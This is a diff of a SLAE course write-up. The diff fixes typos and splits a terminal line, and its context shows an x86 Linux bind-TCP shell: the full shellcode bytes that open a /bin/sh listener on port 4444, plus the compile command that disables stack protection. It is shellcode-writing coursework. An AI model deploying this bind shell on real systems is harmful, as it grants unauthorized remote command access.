@@ -16,7 +16,7 @@ Student ID: SLAE-858
 
 ### Solution
 
-First, we need to understand how the sockets work on linux. For this purpose I create a new program using a lenguage where I am confortable, this socket receives a incoming connection and run a command using execve. 
+First, we need to understand how the sockets work on linux. For this purpose I create a new program using a language where I am confortable, this socket receives an incoming connection and run a command using execve. 
 The methods involved on it:
 
 - socket:   Create an endpoint for communication and return a file descriptor 
@@ -155,7 +155,7 @@ int bind(int sockfd, const struct sockaddr *addr,
         serv_addr.sin_port = htons(4444);
 ```
 
-I saved the created socket in the esi register, so i need to bind this socket. First, I create the sockaddr variable and save it in the register ecx, second, I push in the stack the 3rd argument, third, push ecx (the sockaddr variable) in the stack, it will be the second argument, finally, push the register esi in the stack, it is the file descriptor of the socket.
+I saved the created socket in the esi register, so i need to bind this socket. Firstly, I create the sockaddr variable and save it in the register ecx, secondly, I push in the stack the 3rd argument, thirdly, push ecx (the sockaddr variable) in the stack, it will be the second argument, finally, push the register esi in the stack, it is the file descriptor of the socket.
 
 To create the **sockaddr**, we save in the stack the **port**, **address** and the **address family**. I save the stack pointer address in the ecx register. After, I push the address length, the **sockaddr** created before (ecx) and the file descriptor (esi). Finally, I move the stack pointer to ecx (arguments), mov to ebx the socket call for bind (2) and move the syscall for sockets to eax and execute the interrupt.
 
@@ -358,7 +358,8 @@ hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ ./compile.sh bind-tcp
 hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ objdump -d ./bind-tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ vim shellcode.c 
-hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcodehiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ ./shellcode 
+hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ ./shellcode 
 Shellcode Length:  109
 
 ```
